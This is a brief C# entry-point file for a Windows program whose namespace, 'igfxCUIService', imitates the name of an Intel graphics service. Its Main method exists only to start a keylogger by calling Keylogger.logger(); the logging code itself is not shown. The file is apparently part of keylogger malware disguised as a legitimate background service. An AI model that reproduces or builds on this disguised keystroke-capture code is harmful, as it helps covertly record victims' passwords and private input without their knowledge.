using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace igfxCUIService
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        ///private static Thread o1 = new Thread(Keylogger.logger);
        [STAThread]
        static void Main(string[] args)
        {

                Keylogger.logger();

        }
        

    }
}
